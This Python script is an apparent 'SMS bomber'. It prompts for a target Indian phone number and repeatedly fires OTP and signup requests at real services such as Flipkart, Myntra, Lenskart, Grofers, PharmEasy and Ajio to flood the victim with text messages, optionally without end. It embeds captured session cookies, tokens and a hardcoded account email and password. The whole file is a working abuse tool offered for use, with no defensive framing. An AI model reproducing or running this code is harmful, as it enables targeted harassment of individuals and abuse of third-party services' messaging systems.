import random
import socket
import platform
import os
import time
import pip

try:
    import requests
except ImportError:
    print('Some dependencies are not installed, wait while they are automatically installed...')
    pip.main(["install", "--user", "requests"])
    import requests


# default country code for India.
country_code = '91'

def internet_check():
    try:
        socket.create_connection(('www.google.com', 443))
        return True
    except ConnectionError:
        return False

def api(number, country_code):
    country_code = str(country_code)
    number = str(number)
    index = random.randint(0,10)
    urls =[
        "https://m.redbus.in/api/getOTP?mobile="+number+"&cc="+country_code+"&whatsAppOpted=undefined",
        "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="+number
    ]

    if len(urls) > index:
        try:
            requests.get(urls[index])
            return True
        except (requests.exceptions.HTTPError, requests.exceptions.InvalidURL):
            return False

    elif index == 2:
        
        cookies = {
            'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
            'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
            'lux_uid': '155867904381892986',
            'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
            'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
            's_cc': 'true',
            'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
            'gpv_pn': 'HomePage',
            'gpv_pn_t': 'Homepage',
            'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
            's_sq': '%5B%5BB%5D%5D'
        }

        headers = {
            'Host': 'www.flipkart.com',
            'Connection': 'keep-alive',
            'Content-Length': '60',
            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
            'Origin': 'https://www.flipkart.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Referer': 'https://www.flipkart.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        data = {
          'loginId': '+' + country_code + number,
          'state': 'VERIFIED',
          'churnEmailRequest': 'false'
        }

        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 3:

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "no-cache, no-store",
            "content-type": "application/json;charset=UTF-8",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "x-api-client": "desktop",
            "x-b3-traceid": "991590653358998",
            "x-session-token": "66febc2f-c672-4b99-8459-3803001e52f5",
            "referrer": "https://www.lenskart.com/",
            "referrerPolicy": "no-referrer-when-downgrade",
        }

        cookies = {
            '__cfduid' : 'd3a65bcb99d7ba375200260ca6e4e111b1590653359',
            '__cfruid' : '58f4a287e9879eb4395e8f7edc3ceb51aa0969bd'
        }

        data = {
            'telephone' : number
        }

        response = requests.post('https://api.lenskart.com/v2/customers/sendOtp', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 4:

        headers = {
            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
            'x-meta-app' : 'channel=web',
            'x-myntra-network' : 'yes',
            'x-myntraweb' : 'Yes',
            'x-requested-with' : 'browser'
        }

        cookies = {
            'bm_sz' : '445D91B3FEC3FB62E3952A2A9D7DBE8D',
            '_d_id' : '5d238330-44c2-44e9-8b16-1d1a435c5755',
            'mynt-eupv' : '1',
            '_abck' : 'F3A5E0C006909B891022CDC36CB20133',
            'at' : 'ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNklqRWlMQ0owZVhBaU9pSktWMVFpZlEuZXlKdWFXUjRJam9pWWpka016RXdZekV0WVRCaFlTMHhNV1ZoTFdJd1pHVXRNREF3WkROaFpqSTRZbVprSWl3aVkybGtlQ0k2SW0xNWJuUnlZUzB3TW1RM1pHVmpOUzA0WVRBd0xUUmpOelF0T1dObU55MDVaRFl5WkdKbFlUVmxOakVpTENKaGNIQk9ZVzFsSWpvaWJYbHVkSEpoSWl3aWMzUnZjbVZKWkNJNklqSXlPVGNpTENKbGVIQWlPakUyTURZeE9UZzFOamNzSW1semN5STZJa2xFUlVFaWZRLldIRDBFXzdpTmxJUHlfdkZCRWpVRnBOOHprLTJ4R3ZSdW5SVUhRUnhGcW8',
            'xid' : 'b7d310c1-a0aa-11ea-b0de-000d3af28bfd',
            'utm_track_1' : 'a%3A7%3A%7Bs%3A10%3A%22utm_source%22%3Bs%3A6%3A%22direct%22%3Bs%3A10%3A%22utm_medium%22%3Bs%3A6%3A%22direct%22%3Bs%3A12%3A%22utm_campaign%22%3BN%3Bs%3A11%3A%22campaign_id%22%3BN%3Bs%3A12%3A%22octane_email%22%3BN%3Bs%3A10%3A%22trackstart%22%3Bi%3A1590646567%3Bs%3A8%3A%22trackend%22%3Bi%3A1591251367%3B%7D',
            'utrid' : 'uuid-15906465677277',
            'G_ENABLED_IDPS' : 'google',
            'AKA_A2' : 'A',
            'ak_bmsc' : '483D844FE93AE06250D6FF0B6174220B312C725477200000D38BCF5E39DC341B~plPBTNWXozENjWpWSuvEyH+5MG/X+VN+L2Ulh6m1iAWoV9WEhjFCxJS7gwZ1r61sSkJ3QIxfHAmw863i0bRlvxUWm1gFXnK8iZLYk2mRLwOjbwgH97Uhv/+PBzgIPleo6iur3JGM9g836KtF1d/JXqzyQflEYvm6JFfuxB4Z89jzD9EvhmcWdZRhikTnwC6IwQjabDQAQQ0sEzRwpW6eDC42EjNCa+TjDywsVKW2adRwc=',
            '_mxab_' : 'config.bucket%3Dregular%3Bweb.xceleratorTags%3Denabled%3Bcheckout.cartmerge%3Ddisabled%3Btest-mobile-signup-newest%3DVariantA%3Bmobileonlylogin.recoverysetupsignup%3Dnotmandatory',
            '_pv' : 'regular',
            'dp' : 'd',
            'microsessid' : '990',
            'lt_timeout' : '1',
            'lt_session' : '1',
            'bm_mi' : '0564F4FA26867CF4334D703A91AE3415',
            'bc' : 'true',
            '_xsrf' : 'viLYFHWSa6aOQ36l1mJ394KAx4mhmt24',
            'user_session' : 'rXzY0ECsT20gTqXpt9mwbg',
            'bm_sv' : '9A241E5F4D3A5DD0884984C326D2D412',
            'akaas_myntra_SegmentationLabel' : '1593252059~rv=58~id=5ede7a11b0e14998977c33aad71e66f8~rn=PWA'
        }

        data = {
          'phoneNumber' : number
        }

        response = requests.post('https://www.myntra.com/auth/login/v1/auth/getotp', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 5:
        headers = {
            'origin': 'https://grofers.com',
            'referer': 'https://grofers.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'app_client': 'consumer_web',
            'auth_key': '729b06d118fd076436ee520b9235fb3db741a54a05d0a2dc2b03c3761fdd5ce0'
        }

        cookies = {
            '__cfduid' : 'de3c6d890ae664aa39f4e99a2bb1741021590687168',
            '__cfruid' : '3ec830e630224acbb7955dbf95d494cd3ed41667',
            'ajs_anonymous_id' : '%223fb1cddf-086c-4bef-b75f-04a1d589983d%22',
            'ajs_group_id' : 'null',
            'ajs_user_id' : 'null',
            'city' : '',
            'gr_1_deviceId' : '94fd853a-1014-43aa-8402-2695ff33c087',
            'gr_1_lat' : '28.4640810758775',
            'gr_1_locality' : '1849',
            'gr_1_lon' : '76.9942133969929',
            'rl_anonymous_id' : '%22e3c79578-aa82-4bc1-b91a-73a67ee0dd43%22',
            'rl_user_id' : '%22%22'
        }

        data = {
            'user_phone' : number
        }

        response = requests.post('https://grofers.com/v2/accounts/', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 6:
        headers = {
            'Host': 'api.cloud.altbalaji.com',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://lite.altbalaji.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }


        data = {"country_code":country_code,"phone_number":number}

        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
        if response.status_code == 200:
            return True

    elif index == 7:
        headers = {
            'origin': 'https://pharmeasy.in',
            'referer': 'https://pharmeasy.in/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-length': '30',
            'content-type': 'application/json'
        }

        cookies = {
            'X-App-Version' : '1.0',
            'X-Phone-Platform':'web',
            'X-Default-City':'1',
            'X-Pincode':'400001',
            'XdI':'2011082f3a2776aac04f4ae7a79c1adc'
        }

        data = {
            'contactNumber' : number
        }

        response = requests.post('https://pharmeasy.in/api/auth/requestOTP', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 8:

        headers = {
            'Host': 'www.ref-r.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '26',
            'DNT': '1',
            'Connection': 'keep-alive',
        }

        data = {
          'mobile': number,
          'submit': '1',
          'undefined': ''
        }

        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
        if response.status_code == 200:
            return True

    elif index == 9:
        headers={
            'Host': 'www.heromotocorp.com',
            'Connection': 'keep-alive',
            'Content-Length': '126',
            'Accept': '*/*',
            'Origin': 'https://www.heromotocorp.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }

        cookies = {
        '_ga': 'GA1.2.1273460610.1561191565',
        '_gid': 'GA1.2.172574299.1561191565',
        '_gcl_au': '1.1.833556660.1561191566',
        '_fbp': 'fb.1.1561191568709.1707722126',
        'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
        }

        data = {
          'mobile_no': number,
          'randome': 'ZZUC9WCCP3ltsd/JoqFe5HHe6WfNZfdQxqi9OZWvKis=',
          'mobile_no_otp': '',
          'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
        }

        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, json=data)
        if response.status_code == 200:
            return True

    elif index == 10:

        headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Access-Control-Request-Headers': 'content-type',
            'Connection': 'keep-alive',
            'Host': 'login.web.ajio.com',
            'Origin': 'https://www.ajio.com',
            'Referer': 'https://www.ajio.com/',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36'
        }

        data = {
            'firstName': "Ayam",
            'genderType': "Male",
            'login': "adobhal1@mail.ccsf.edu",
            'mobileNumber': number,
            'password': "Bruh@1234",
            'requestType': "SENDOTP"
        }

        response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', headers=headers, json=data)
        if response.status_code == 200:
            return True
    return False

def bomb(country_code, number, limit, delay):
    count = 0
    failed = 0
    success = 0
    print("Starting bombing, press ctrl+c or ctrl+z to stop...")
    while success < limit:
        try:
            res = api(number, country_code)
        except Exception:
            res = False
        clrscr()
        count += 1
        if not res:
            failed += 1
        success = count - failed
        print('target number:', str(number))
        print('requests sent:', count)
        print('successful requests:', success)
        print('failed requests:', failed)
        time.sleep(delay)

def infinite(country_code, number, delay):
    count = 0
    failed = 0
    success = count - failed
    print("Starting bombing, press ctrl+c or ctrl+z to stop...")
    while True:
        try:
            res = api(number, country_code)
        except Exception:
            res = False
        clrscr()
        count += 1
        if not res:
            failed += 1
        success = count - failed
        print('target number:', str(number))
        print('requests sent:', count)
        print('successful requests:', success)
        print('failed requests:', failed)
        time.sleep(delay)

def clrscr():
    if platform.system().lower() == "linux":
        os.system('clear')
    else:
        os.system('cls')

if not internet_check():
    print('''your internet doesn't seem to be working. Exiting...''')
    exit(1)

clrscr()
num = int(input('Enter the phone number of the target: +91 '))
lim = int(input("Enter the limit of SMS(0 for infinite): "))
delay = int(input('enter the delay in seconds(recommended: 2 secs): '))

if lim == 0:
    infinite(country_code, num, delay)
else:
    bomb(country_code, num, lim, delay)